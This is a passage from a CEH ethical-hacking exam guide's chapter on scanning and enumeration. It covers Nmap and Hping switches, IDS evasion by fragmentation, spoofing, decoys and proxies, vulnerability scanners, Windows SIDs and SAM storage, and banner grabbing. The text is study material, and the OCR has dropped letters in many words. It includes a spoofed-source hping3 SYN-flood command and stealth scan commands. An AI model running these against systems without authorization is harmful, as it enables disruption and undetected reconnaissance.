between open and filtered ports, leaving you with the state open|filtered in both cases.

NOTE SCTP doesn’t work on Windows and most home routers don’t
support it. This link provides some details on why it isn’t widely used:
https://stackoverlow.com/questions/1171555/why-is-sctp-not-much-
used-known.

03-ch03.indd 110 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

111

Nmap
So now that we know what the scan types are called, how do we pull them off? With a
port scanner, of course, and without a doubt, the most widely used scanning and enu-
meration tool on the planet is Nmap. Nmap can perform many different types of scans
(from simply identifying active machines to port scanning and enumeration) and can
also be configured to control the speed at which a scan operates. In general, the slower
the scan, the less likely you are to be discovered. It comes in both a command-line version
and a GUI version (the aforementioned Zenmap), works on multiple OS platforms, and
can even scan over TCP and UDP. And the best thing of all? It’s free.

The Nmap syntax is fairly straightforward:

nmap <scan options> <target>

The target for Nmap can be a single IP address, multiple individual IPs separated by
spaces, or an entire subnet range (using CIDR notation). For example, to scan a single
IP address, the command might look like

nmap 192.168.1.100

whereas scanning multiple IPs would look like

nmap 192.168.1.100 192.168.1.101

and scanning an entire subnet would appear as

nmap 192.168.1.0/24

Starting Nmap without any of the options runs a SYN scan (though it substitutes a
full connect scan if the user does not have proper privileges to send raw packets or if IPv6
targets are specified). But to get really sneaky and act like a true ethical hacker, you’ll
need to learn the option switches—and there are a bunch of them. The good news is,
almost an endless assortment of help is available for you on the Web. For example, the
web page located at https://svn.nmap.org/nmap/docs/nmap.usage.txt shows a screen
pull of Nmap run without any option switches or targets set at all, and a simple search
for “Nmap switches” will provide tons of sites with full-syntax command samples for
you to mix around for your own needs. For a full and complete rundown of every switch
and option, visit Nmap’s man page, or check with the originator’s documentation page
at https://nmap.org/docs.html. Table 3-4 lists some of the more relevant Nmap switches
you’ll need to know.

NOTE Although your exam almost always points to slower being better,
paranoid and sneaky scans can take exceedingly long times to complete. I
you get too carried away and run multiple instances o Nmap at very ast (-T5)
speeds, you’ll overwhelm your NIC and start getting some really weird results.
Another un act: not assigning a T value at all will deault to -T3, “normal.”

03-ch03.indd 111 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

112

Nmap Switch Description Nmap Switch Description

-sA ACK scan -PI ICMP ping

-sF FIN scan -Po No ping

-sI IDLE scan -PS SYN ping

-sL DNS scan (aka list scan) -PT TCP ping

-sN NULL scan -oN Normal output

-sO Protocol scan -oX XML output

-sP Ping scan -T0 Serial, slowest scan

-sR RPC scan -T1 Serial, slowest scan

-sS SYN scan -T2 Serial, normal speed scan

-sT TCP connect scan -T3 Parallel, normal speed scan

-sW Window scan -T4 Parallel, ast scan

-sX XMAS scan

Table 3-4 Nmap Switches

As you can see, quite a few option switches are available for the command. The “s”
commands determine the type of scan to perform, the “P” commands set up ping sweep
options, and the “o” commands deal with output. The “T” commands deal with speed
and stealth, with the serial methods taking the longest amount of time. Parallel methods
are much faster because they run multiple scans simultaneously. Again, the slower you run
scans, the less likely you are to be discovered. The choice of which one to run is yours.

Combining option switches can produce specific output on any given target. For
example’s sake, suppose you wanted to run a SYN port scan on a target as quietly as pos-
sible. The syntax would look something like this:

nmap 192.168.1.0/24 -sS -T0

If you wanted an aggressive XMAS scan, perhaps the following might be to your liking:

nmap 192.168.1.0/24 -sX -T4

The combinations are endless and provide worlds of opportunity for your port-
scanning efforts. You’ll need to know Nmap switches for the port scans very well, and
how to compare different variations. For example, you can certainly turn on each switch
you want for each feature, but using something like the -A switch enables OS detection,
version detection, script scanning, and traceroute automatically for you.

EXAM TIP It is impossible or me to stress enough how well you need to
know Nmap. You will be asked tricky questions on syntax, scan types, and
responses you’d expect rom open and closed ports. The list goes on. Please
do not rely solely on this writing, or any other, or your study. Download
the tool. Play with it. Use it. It may very well mean the dierence between
passing and ailing your exam.

03-ch03.indd 112 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

113

Nmap handles all scan types we discussed in the previous section, using switches
identified earlier. In addition to those listed, Nmap offers a Window scan. It works much
like the ACK scan and provides information on open ports. Many more switches and
options are available for the tool. Again, although it’s a good bet to study the informa-
tion presented here, you absolutely need to download and play with the Nmap tool to be
successful on the exam and in your career.

NOTE Port sweeping and enumeration on a machine is also known as
fingerprinting, although the term is normally associated with examining
the OS itsel. You can ingerprint operating systems with several tools we’ve
discussed already.

No Candy Here
One of the bad things about getting older is you lose out on the real fun of just
being a kid. Take Halloween, for example. It’s one of my favorite holidays of the
year and, as I write this, is several months off. I’ll be dressed as a pirate, as I am
nearly every year, and I’ll have a blast handing out candy to cutely adorned kids in
my friend’s neighborhood. But candy for me? Nah—I won’t be trick-or-treating.
Imagine if an old guy went walking up to a house dressed as a pirate demanding a
Charms Blow Pop (one of my all-time favorites!). Instead, I’ll have to sneak some
sugar-coated goodness out of our bowl when my wife isn’t looking and rely on
memories of trick-or-treats past.

One thing I do remember about trick-or-treating as a kid was the areas Mom
and Dad told me not to go to. See, back in the ’70s there were all sorts of stories
and horrid rumors about bad stuff in the candy—evil people handing out chocolate
bars with razor blades in them or needles stuck in gum. For whatever reason, some
neighborhoods and areas were considered off limits to me and my group, lest we get
a bag full of death candy instead of heavenly nirvana.

So, what does this have to do with ethical hacking? Other than the obvious tie-
ins with nerd-dom and costumed fun, it’s actually apropos to scanning and enu-
meration. When it comes to these efforts, there are definitely areas you shouldn’t
go knocking for candy. You would most likely find some tasty virtual treats, but the
tricks would be disastrous to your continued freedom.

A scan of the 129.51.0.0 network? While close to my old home and right around
the corner from where I used to live, I’m pretty sure the friendly, military, network-
monitoring folks at Patrick AFB wouldn’t look too kindly on that. 129.63.0.0?
Johnson Space Center would likely not be happy to see you snooping around.
128.50.0.0? Don’t poke the Department of Defense guys. They’re a nervous lot.

There are many, many other examples of IP address space you should just leave
alone if you’re at all concerned about staying out of prison, but I think you get
the point. Try an Internet browser search on “IP addresses you shouldn’t scan” for
more examples. If you do your footprinting homework, you should be able to avoid
all these anyway. But if you don’t, don’t be surprised to find your virtual trick-or-
treating a truly scary event.

03-ch03.indd 113 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

114

Figure 3-10 Nmap output

Knowing how to recognize and read Nmap output is just as important as learning
the syntax of the command. The GUI version of the tool, Zenmap, makes reading this
output easy, but the command-line output is just as simple. Additionally, the output is
available via several methods. The default is called interactive, and it is sent to standard
output (text sent to the terminal). Normal output displays less runtime information
and fewer warnings because it is expected to be analyzed after the scan completes rather
than interactively. You can also send output as XML (which can be parsed by GUIs or
imported into databases) or in a “greppable” format (for easy searching). Figure 3-10
shows a brief example. Ports are displayed in output as open, closed, or filtered. Open is
obvious, as is closed. Filtered means a firewall or router is interfering with the scan.

NOTE NetScanTools Pro (https://www.netscantools.com/nstpromain.html)
is another scan tool you probably want to get to know. It holds our sets o
tools in the suite: Active Discovery and Diagnostic Tools (testing/locating
devices on net), Passive Discovery Tools (monitor activities o devices and
gather inormation), DNS Tools (sel-explanatory), and Local Computer and
General Inormation tools (details about local system).

Hping
Although Nmap is the unquestioned leader of the port-scanning pack, plenty of other tools
are available that are just as adept. Hping (Hping2 or Hping3) is another powerful tool
for both ping sweeps and port scans, and is also a handy packet-crafting tool for TCP/IP.
Hping works on Windows and Linux versions and runs nearly any scan Nmap can put
out. The only real downside, for people like me who prefer pictures and clicking things, is

03-ch03.indd 114 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

115

Switch Description

-1 Sets ICMP mode. For example, hping3 -1 172.17.15.12 perorms an ICMP ping.

-2 Sets UDP mode. For example, hping3 -2 192.168.12.55 -p 80 perorms a UDP
scan on port 80 or 192.168.12.55.

-8 Sets scan mode, expecting an argument or the ports to be scanned (single, range
[1–1000], or “all”). For example, hping3 -8 20-100 scans ports 20 through 100.

-9 Sets Hping in listen mode, to trigger on a signature argument when it sees it
come through. For example, hping3 -9 HTTP -I eth0 looks or HTTP signature
packets on eth0.

--lood Sends packets as ast as possible, without taking care to show incoming replies.
For example, a SYN lood rom 192.168.10.10 against .22 could be kicked o with
hping3 -S 192.168.10.10 -a 192.168.10.22 -p 22 --flood.

-Q --seqnum Collects sequence numbers generated by the target host. This can be useul
when you need to analyze whether a TCP sequence number is predictable (or
example, hping3 172.17.15.12 -Q -p 139 -s).

-F Sets the FIN lag.

-S Sets the SYN lag.

-R Sets the RST lag.

-P Sets the PSH lag.

-A Sets the ACK lag.

-U Sets the URG lag.

-X Sets the XMAS scan lags.

Table 3-5 Hping Switches

that it’s still a command-line-only tool. Just as with Nmap, Hping3 has specific syntax for
what you’re trying to accomplish, with tons of switches and options. For example, a simple
ping sweep can be accomplished by typing hping3 -1 IPAddress. A full and complete
breakdown of all switches and syntax can be found on Hping’s man page, located at www
.hping.org/manpage.html. For study purposes, Table 3-5 lists a few of the switches you are
likely to see on the exam.

EXAM TIP Know Hping3 syntax very well. Grab the tool and practice,
especially using it or ICMP requests, various scans, SYN loods, and speciic
uses (like discovering sequence numbers and timestamps).

Other Scanning Tools
Some other tools for accomplishing port scanning fun include Advanced Port Scanner,
MegaPing, Net Tools, and PRTG Network Monitor (be sure to check the tool list at the
end of this book for more). And, of course, we shouldn’t neglect mentioning scanning
tools designed for mobile use. IP Scanner (https://10base-t.com), Fing (www.fing.com),
zANTi (www.zimperium.com), and PortDroid Network Analysis (https://play.google
.com) are all examples of tools designed for your mobile device, and all are worth your
time in downloading and learning.

03-ch03.indd 115 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

116

Regardless of whether your choice is running Nmap on a Linux machine, harnessing
command-line option power like a pro, or using SuperScan’s simple GUI on a Windows
machine, the goal is the same. Port scanning identifies which ports are open and gives
you more information in building your attack vectors. Each scan type you attempt will
react differently and take different lengths of time to pull off (a UDP scan of Linux
machines can take a very long time, for instance), and you’ll definitely need to know the
output to look for with each one. However, the tools are all designed to achieve the same
overall end.

Evasion
Want more fun in scanning? Try doing it without being caught. Whether you’re port
scanning, searching for wireless openings, or just wandering about looking for physical
security clues, stealth is always important. Hiding your activities from prying security-
professional eyes is something you’ll need to prepare for and master in each step of the
hacking phases, and scanning is no exception. Sometimes scanning can be interrupted by
pesky firewalls or monitoring devices, and you’ll be forced to disguise who you are and
what you’re up to. Options for accomplishing this include fragmenting packets, spoofing
an IP address, source routing, and proxies.

One of the most common (and possibly elegant) methods used to evade detection by
an IDS is fragmenting packets. The idea isn’t to change the scan itself—you can still run
a full connect scan, for instance—but to crack apart the packets before they’re sent so the
IDS can’t recognize them. If you split the TCP header into several packets, all the IDS
sees is useless chatter. Assuming you’re not flooding the network segment too fast with
them, your scanning won’t even be noticed. For example, an Nmap command like nmap
-sS -A -f 172.17.15.12 might work to fragment a SYN scan (while OS fingerprinting
along the way).

EXAM TIP ECC really loves testing your knowledge o the active versus
passive distinction. In enumeration, active OS ingerprinting involves
sending crated, nonstandard packets to a remote host and analyzing the
replies. Passive OS ingerprinting involves sniing packets without injecting
any packets into the network—examining details like Time-to-Live (TTL),
window sizes, Don’t Fragment (DF) lags, and Type o Service (ToS) ields
rom the capture.

Spoofing an IP address is exactly what it sounds like: the hacker uses a packet-crafting
tool of some sort to obscure the source IP address of packets sent from her machine.
Many tools are available for this—Hping, Scapy, and Komodia Redirector, for example.
You can also find this functionality built into a variety of other scanning tools. Ettercap
and Cain, usually thought of more for their sniffing capabilities, provide robust and
powerful spoofing capabilities as well; heck, even Nmap can spoof. Just be cautious in
spoofing—sometimes you can spoof so well, the information you’re working so hard to
obtain never finds its way back to you.

03-ch03.indd 116 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

117

EXAM TIP Remember, spooing an IP address means any data coming back
to the ake address will not be seen by the attacker. For example, i you spoo
an IP address and then perorm a TCP scan, the inormation won’t make its
way back to you.

Source routing provides yet another means to disguise your identity on a network,
assuming you come across something designed circa 1995. Source routing was originally
designed to allow applications to specify the route a packet takes to a destination, regard-
less of what the route tables between the two systems say, but was deprecated long, long
ago. Its main benefit used to be assisting network managers in forcing traffic around
areas of potential congestion. How was this useful to a hacker? The attacker could use
an IP address of another machine on the subnet and have all the return traffic sent back,
regardless of which routers are in transit. Protections against source-routing attacks are
prevalent and effective, and most firewalls and routers detect and block source-routed
packets, so this just won’t work on modern networks. It is testable though, so learn it.

NOTE Another evasion eort is known as IP address decoy. The basic idea is
you obuscate the real source o the scan by hiding it among a whole bunch
o decoy source addresses (making it appear the decoys and the host are
scanning). You can pull this o in Nmap a ew dierent ways. First, nmap
-D RND:10 X.X.X.X generates a number o decoys and randomly puts the
real source IP address between them. I you want to get a little more manual
in your eort, try nmap -D decoyIP1,decoyIP2,decoyIP3,...,sourceIP,...
[target]. This version lets you decide how many decoys to generate and
where the source IP address appears.

Finally, our last method of IDS evasion (at least so far as your exam is concerned)
involves employing proxies to hide behind. A proxy is nothing more than a system you
set up to act as an intermediary between you and your targets. In many instances, prox-
ies are used by network administrators to control traffic and provide additional security
for internal users, or for tasks like remotely accessing intranets. Hackers, though, can use
that technology in reverse—sending commands and requests to the proxy and letting the
proxy relay them to the targets. So, for evasion purposes, anyone monitoring the subnet
sees the proxy trying all these actions, not the hacker.

EXAM TIP It’s important to remember that a proxy isn’t just a means
or obuscating the source. Proxies are used or a variety o purposes,
so when questions show up asking you what the proxy is or, use contextual
clues to help out.

Proxying can be done from a single location or spread across multiple proxies to
further disguise the original source. Hundreds of free, public proxies are available to
sign up for, and a simple Internet search will point you in the right direction. If you

03-ch03.indd 117 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

118

want to set up proxy chains, where multiple proxies further hide your activities, you
can use tools such as Proxy Switcher (www.proxyswitcher.com), ProxyChains (http://
proxychains.sourceforge.net/), CyberGhost (www.cyberghostvpn.com), and Proxifier
(www.proxifier.com).

Another great method for anonymity on the Web is to use The Onion Router (Tor).
Tor basically works by installing a small client on the machine, which then gets a list
of other clients running Tor from a directory server. The client then bounces Internet
requests across random Tor clients to the destination, with the destination end having
very little means to trace the original request back. Communication between Tor clients
is encrypted, with only the last leg in the journey—between the Tor “cloud” and the
destination—sent unencrypted. One really important point to keep in mind, though, is
that anyone can be a Tor endpoint, so signing up to voluntarily have goodness-knows-
what passing through your machine may not be in your best interests. Additionally, Tor
is highly targeted, and there are multiple lawsuits pending—so be careful.

NOTE The Tor Project had a decision in U.S. District Court (Seaver v. Estate
of Cazes) where a 13-year-old died ater buying drugs online that upheld
their immunity under 47 USC Sec. 230. In short, the decision held that Tor
acilitates access but doesn’t create content, and the case was tossed.

The Shadow Knows
ECC has put a very large emphasis on the mobile world of late, and rightly so. For
almost every area of concentration in its course, ECC makes sure to mention tools
and actions specific to the mobile world, and evasion is no different. Just a few of the
tools ECC mentions include proxydroid (https://github.com/madeye/proxydroid),
Servers Ultimate (www.icecoldapps.com), and NetShade (www.raynersw.com).
Anonymizers include Orbot (https://guardianproject.info) and Psiphon (https://
psiphon.ca), among others. But one evasion tool listed in particular caught my eye.
Shadowsocks (http://shadowsocks.org) may be listed as a mobile anonymizer/proxy,
but, man, does it have a cool background story, and a much wider application.

Here in the United States, we simply take for granted that if we type in an
address, our browser will display it, regardless whether or not it’s in the best interest
of our governing bodies for us to read it. We have near unbridled freedom to check
out anything we want to; however, it’s not that way in the rest of the world. China,
for example, implements extensive restriction of content from the Internet. Chinese
citizens, in large measure, only get to see what the government wants, when the
government wants them to see it. The efforts to restrict information flow has been
dubbed the “Great Firewall.”

In 2012, after Chinese government crackdowns on VPNs subverting the Great
Firewall, a Chinese programmer named “clowwindy” created and released a new

03-ch03.indd 118 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

119

encrypted proxy project named “Shadowsocks.” What made this one so different
from other VPNs, and what led to its rapid rise within the country to gain access
to the free Internet, is the way in which it works. Instead of relying on just a few
large VPN service providers and popular Internet protocols, Shadowsocks allows
each user to create his own unique proxy connection, creating an encrypted con-
nection between client and proxy server using the open source Internet protocol
SOCKS5. This implementation makes it near impossible for censors to distinguish
traffic downloading a music video or pulling up a stock ticker from traffic heading
to sites the Chinese government wants to censor.

So why is Shadowsocks listed as a “mobile” proxy/anonymizer? I have no idea,
but it doesn’t change the fact it has got a very cool backstory. Use your favorite
search engine and check it out yourself…assuming, of course, you’re still allowed to.

Finally, another ridiculously easy method for disguising your identity, at least for
port 80 (HTTP) traffic, is to use an anonymizer. Anonymizers are services on the Inter-
net that make use of a web proxy to hide your identity. Thousands of anonymizers are
available—simply do a Google search and you’ll see what I mean. Be careful in your
choice, though; some of them aren’t necessarily safe, and their owners are set up spe-
cifically to steal information and plant malware. Some anonymizers referenced by ECC
are Guardster (http://guardster.com), Ultrasurf (http://ultrasurf.us), Psiphon (https://
psiphon.ca), and Tails (https://tails.boum.org). Tails isn’t an application, per se; it’s an
actual live OS you can run from a USB that anonymizes the source and leaves no trace
on the system you’re on. Neat!

NOTE Did you know Google puts a cookie on your system with a unique
identiier that lets them track your web activity? Want to get rid o it?
Gzapper (www.dummysotware.com) is what you want, and you may see a
reerence to it on the exam too.

Vulnerability Scanning
Lastly, before we move on to the enumeration section of this chapter, I have to devote a
little time to vulnerability scanning. And, listen, before you start screaming at me (having
just read half a chapter about stealth) that vulnerability scanning requires a certain level
of access and will definitely trigger roughly a thousand alerts that will notify everyone in
the building you’re hacking, I know. I get it. It’s not my choice to put this topic here, but
it’s where ECC says it belongs. So we’ll cover it. And I’ll keep it short, I promise.

Vulnerability scanning is exactly what it sounds like—running a tool against a target
to see what vulnerabilities it may hold. This indicates to any rational mind the scanner
itself must be really good at keeping up to date with known vulnerabilities, and really

03-ch03.indd 119 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

120

good at not adversely affecting the systems it’s pointed at. Fortunately, there are several
vulnerability-scanning tools about. Some are enterprise-level scanning beasts, with the
capability to scan everything in your enterprise and provide nice reports so you can track
down SAs and berate them over missing patches. An example targeted to specific tasks is
Microsoft Baseline Security Analyzer (MBSA), which lives solely in the Windows world
but does a good job telling you what patches and such are missing on your machine.

The industry standard as far as vulnerability scanning goes has got to be Tenable
(https://www.tenable.com/products/tenable-sc). Tenable has different product options
to accomplish different tasks; Nessus can be loaded on your laptop for scanning,
whereas Security Center (tenable.sc) is an enterprise-level version. You can get a free
evaluation of Nessus for seven days. Should you decide to purchase it, you’ll be out
$2990. Every year.

On various practice exams and study materials, I’ve seen reference to ECC digging
down into the weeds on exactly what is on which Nessus tab. Because this material is not
covered in the official courseware, we won’t spend page count going through the inner
workings of the scanner (although you can see a neat picture of the Nessus General Set-
tings page in Figure 3-11).

Nessus is the de facto industry standard, used by corporations worldwide and in nearly
all U.S. federal agencies. And it isn’t just a vulnerability scanner, as it scans for viruses,
malware, backdoors, notnet hosts, malicious processes, and web services linking to mali-
cious content. It features a robust high-speed asset discovery, and allows for configuration
auditing and sensitive data discovery. There are more than 450 templates available for
compliance (e.g., FFIEC, HIPAA, NERC, PCI) and configuration (e.g., CERT, CIS,
COBIT/ITIL, DISA STIGs) auditing. Per Tenable, “Nessus supports noncredentialed,
remote scans; credentialed, local scans for deeper, granular analysis of assets; and offline
auditing on a network device’s configuration.”

Figure 3-11 Nessus

03-ch03.indd 120 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

121

This is not to say Nessus is the only option out there—far from it. Other readily
available and popular scanners include GFI LanGuardand OpenVAS. GFI LanGuard
(www.gfi.com) offers quality vulnerability and compliance scanning, as well as built-
in patch management. OpenVAS (www.openvas.com) is probably the best out of the
bunch, as it is for all intents and purposes a free version of Nessus. It can perform
many of the same functions at (or even above) the same level of reliability and quality
for zero cost.

Enumeration
In its basic definition, to enumerate means to specify individually, to count off or name
one by one. Enumeration in the ethical hacking world is just that—listing the items we
find within a specific target. We create connections to a device, perform specific actions
to ask specific questions, and then use the results to identify potential attack vectors. If
ports are doors and windows and port scanning can be equated to knocking on them to
see whether they are open, enumerating is more akin to chatting with the neighbor at the
door. When we enumerate a target, we’re moving from passive information gathering to
a much more active state. No longer satisfied with just knowing which ports are open, we
now want to find targets like open shares and any easy-to-grab user account information.
We can use a variety of tools and techniques, and a lot of it bleeds over from scanning.
Before we get fully involved in enumerating, though, it’s helpful to understand the secu-
rity design of your target.

Windows System Basics
Hands down the most popular operating system in the world is Microsoft Windows.
Everything from old Windows 2000 to Windows 10 systems will constitute the vast
majority of your targets in the real world. Taking some time to learn some of the basics of
its design and security features will pay dividends in your enumeration future.

Obviously enumeration can and should be performed on every system you find in your
target network, regardless of operating system. However, because Windows machines
make up the majority of targets, you need to spend a little more time on them. As a
family of operating systems, Windows provides a wide range of targets, ranging from the
ridiculously easy to fairly hardened machines. Windows XP and Windows Server 2000
machines are still roaming around and present easy targets. Windows Server (now at
2022) and Windows 10 (not to mention previous versions 7 and 8) up the ante quite a
bit. Regardless of version, there are a few basic features that remain constant despite the
passage of time. Some of this information you may already know, and some of it you may
not, but all of it is important to your future.

Everything in a Windows system runs within the context of an account. An account
can be that of a user, running in something called user mode, or the system account. The
system account is built into the OS as a local account and has widespread privileges on
the local computer. In addition, it acts as the computer itself on the network. Actions and
applications running in user mode are easy to detect and contain; however, anything run-
ning with system account privileges is, obviously, concerning to security professionals.

03-ch03.indd 121 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

122

NOTE Ever heard o the “security context” o a Microsot account? It deines
a user identity and authentication inormation, and applications (such as
Microsot Exchange Server or SQL Server) need a user security context to
provide security using Microsot access control lists (ACLs) or other tools.

This is not to say that there are only two means of security control when it comes to
accounts—quite the contrary, as I’m sure some of you were already running off to your
MCSE books and pointing out the difference between rights and permissions and their
effect on accounts. User rights are granted via an account’s membership within a group and
determine which system tasks an account is allowed to perform. Permissions are used to
determine which resources an account has access to. The method by which Windows keeps
track of which account holds what rights and permissions comes down to SIDs and RIDs.

Sometimes the Best Idea Is the Worst One
Imagine you work for the largest distributor of operating systems on the planet.
You’re sitting there one day reading the news and notice everyone around you is
reading and sending things on their mobile devices. The lightning bolt hits—
wouldn’t it be great to have one interface that is the same on whatever screen you’re
looking at? Wouldn’t it be fantastic for mobile users to seamlessly interact with their
desktop computers, and vice versa, on one OS, to have one interface that looks the
same on both devices? Wouldn’t it be just totally awesome for that to then show up
everywhere? Just think of the market share! We’ll make billions!

I can’t blame Microsoft for trying with Windows 8. You have to admit, the idea
sounded great. Heck, it still sounds great. But sometimes great ideas just don’t work
when implemented in the real world and while I’m absolutely positive Microsoft
was convinced it was about to change the world, forcing a mobile-like interface onto
a PC desktop was a horrible idea. The idea of a single interface may have sounded
great, but the implementation—removing the Start button from an interface the
vast majority of systems users had seen since day one, and then leaving it to those
users to try and figure out what the heck hot corners, tiles, and charms were—was
just horrible.

So did Windows 10 save Microsoft operating systems? Market share for desktop
systems shows Microsoft went from a high of 88 percent in 2014 to…87.56 per-
cent as of October 2020, per NetMarketShare (https://netmarketshare.com). Draw
your own conclusions. The OS seems to run well, introduces a more friendly and
intuitive interface, and adds some additional security features. Although it has some
weird, unexplainable characteristics, all in all it seems to have been received well,
and I don’t think Microsoft is going away anytime soon.

Of course, there’s no telling what the future holds. Maybe someone else will
successfully try the “one OS for all” tactic and we’ll all ditch Windows overnight.
Maybe operating systems themselves will be replaced by interactive robot faces and
artificial intelligence. For now, we’ll just place a copy of Windows 8 on the shelf in
the Museum of Dumb Ideas. Hurry, everyone gets a free Zune at the door.

03-ch03.indd 122 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

123

A security identifier (SID) identifies user, group, and computer accounts and follows
a specific format. A resource identifier (RID) is a portion of the overall SID identifying a
specific user, computer, or domain. SIDs are composed of an S, followed by a revision
number, an authority value, a domain or computer indicator, and a RID. The RID por-
tion of the identifier starts at 500 for the administrator account. The next account on the
system, Guest, is RID 501. All users created for the system start at 1000 and increment
from that point forward—even if their user names are re-created later. For example’s sake,
consider the following SID:

S-1-5-21-3874928736-367528774-1298337465-500

We know this is an administrator account because of the 500 at the end. An SID
of S-1-5-22-3984762567-8273651772-8976228637-1014 would be the account of the
15th person on the system (the 1014 tells us that).

Another interesting facet of Windows security architecture you’ll need to know as
basic information involves passwords and accounts (and, for the purposes of this discus-
sion, using tokens, smartcards, and biometrics work the same). As you know, a user ID
and a password are typed in by users attempting to log into Windows. These accounts
are identified by their SIDs (and associated RIDs), of course, but the passwords for them
must be stored somewhere, too. In Windows, that somewhere is C:\Windows\System
32\Config\SAM. The SAM database holds (in encrypted format, of course) all the local
passwords for accounts on the machine. For those machines that are part of a domain,
the passwords are stored and handled by the domain controller. We’ll definitely get into
cracking and using the SAM later.

Unix/Linux System Basics
As with the discussion of Windows systems in the previous section, we’ll delve into more
of the OS a little further on, and throughout this book. For now, though, we at least
need to pause for a moment and look at enumeration basics you’ll need for your exam
regarding Unix and Linux.

Linux OS versions make up 2.35 percent of the market share (with macOS and its
predecessors grabbing 9.54 percent), but I can already hear the Linux zealots shouting,
“Yeah, but it’s the most important 2.35 percent of the market, chump!” This may be a
hard argument to dispute, as virtually every security person and IT specialist I’ve ever
worked with gleefully announced their preference for, and use of, a particular Linux
distribution (aka distro). Heck, you will be diving into at least one of these distros in
learning your craft here: EC-Council uses Parrot OS (https://www.parrotsec.org/) as its
official Linux distribution for security tools.

NOTE Unix and Linux are used somewhat interchangeably in this writing.
Generally speaking, unless we call it out speciically, command unction and
OS details reer to Linux distributions.

03-ch03.indd 123 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

124

So what do you need to know about Linux for enumeration purposes? EC-Council
provides a whopping one-half page to the subject in the approximately 386-page official
courseware, so we’ll keep this discussion short and sweet, accordingly. This section essen-
tially boils down to a quick primer on user and group locations and identification, and a
few commands to remember.

NOTE While oicial ECC enumeration coverage or the exam seems short
and sweet, I highly encourage you to download, install, explore, and play
with multiple Linux distros. You’ll learn more making your way around your
own install than you ever will rom any book.

A Linux user identifier (UID) is a unique number assigned to each user on the system,
which is then used by the OS to determine which system resources the user can access.
The UID of the root user is 0, and most distributions reserve the first 100 UIDs for sys-
tem use. New users are assigned UIDs starting from either 500 or 1000, depending on
the distro and the account created, and simply take the next number in line. For example,
if you had five users on your Ubuntu install and added a sixth, that user’s UID would be
1005 (the first user is 1000, the second is 1001, etc.).

Groups in Linux work in much the same way, except their identifiers are called group
identifiers (GIDs). Just like with UIDs, GIDs are handed out in a sequential order (start-
ing with 500), and the first 100 GIDs are usually reserved for system use. For example,
the GID of 0 corresponds to the root group and the GID of 100 typically represents the
users group. New groups are usually assigned GIDs starting from 1000, and all GIDs are
stored in the /etc/groups file.

The command to identify a particular user or group is the id command. For example,
id -u username will show a specific user’s UID. To find the user’s GID, try id -g username.
How about all groups the user belongs to? That’d be id -G username, with id username
showing the UID and all groups associated with a user.

EXAM TIP Examples o the Linux enumeration commands are inger (which
provides inormation on the user and host machine), rpcino and rpcclient
(which provide inormation on RPC in the environment), and showmount
(which displays all the shared directories on the machine).

Enumeration Techniques
Enumeration is all about figuring out what’s running on a machine. Remember all that
time we spent discussing the virtues of researching current vulnerabilities? Perhaps know-
ing what operating system is in play on a server will help you determine which vulner-
abilities may be present, which makes that whole section a lot more interesting to you
now, right? And don’t let enumeration just come down to figuring out the OS either—
there’s a lot more here to look at.

03-ch03.indd 124 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

125

Banner Grabbing
Banner grabbing is actually listed as part of the scanning methodology, but dang it—it
belongs here in enumeration. After all, that’s what it does. It’s one of the easiest enumer-
ating methods, but it sure can have a big bang for the buck.

Basically the tactic involves sending an unsolicited request to an open port to see what,
if any, default message (banner) is returned. Depending on what version of the applica-
tion is running on the port, the returned banner (which could be an error message,
HTTP header, or login message) can indicate a potential vulnerability for the hacker to
exploit. A common method of performing banner grabbing is to use a simple tool already
built into most operating systems, Telnet.

EXAM TIP ECC deines two dierent categories o banner grabbing—active
and passive. Active banner grabbing involves sending specially crated
packets to remote systems and comparing responses to determine the OS.
Passive banner grabbing involves reading error messages, sniing network
traic, or looking at page extensions. I’d love to tell you why this distinction
is there, or explain the reasoning behind it, but I can’t. Just go with the
deinitions and chalk this up as something to know just or the exam.

As you know already, Telnet runs on port 23. Therefore, if you simply type telnet
IPAddress, you’ll send TCP packets to the recipient with the destination port set to 23.
However, you can also point it at any other port number explicitly to test for connectiv-
ity. If the port is open, you’ll generate some form of banner response. For example, sup-
